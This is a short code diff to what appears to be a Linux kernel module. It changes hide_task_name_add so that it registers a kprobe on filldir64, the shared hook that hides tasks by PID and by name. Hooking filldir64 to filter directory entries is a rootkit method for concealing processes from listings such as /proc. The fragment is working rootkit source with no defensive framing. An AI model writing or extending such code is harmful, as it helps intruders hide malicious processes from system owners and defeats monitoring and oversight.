@@ -69,10 +69,18 @@ int hide_task_name_add(const char *name) {
 	unsigned long flags;
 	unsigned int i, free_slot = HIDE_NAME_SLOTS;
 	size_t len;
+	int rc;
 
 	if (!name) return -EINVAL;
 	len = strnlen(name, HIDE_NAME_MAX);
 	if (len == 0 || len >= HIDE_NAME_MAX) return -EINVAL;
+
+	/* Same lazy arm as hide_task_add — the filldir64 kprobe services BOTH
+	 * PID and name hide, and either add-path may be the first caller. */
+	mutex_lock(&kp_lock);
+	rc = hide_task_register_kprobe_locked();
+	mutex_unlock(&kp_lock);
+	if (rc) return rc;
 
 	raw_spin_lock_irqsave(&hidden_names_lock, flags);
 	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
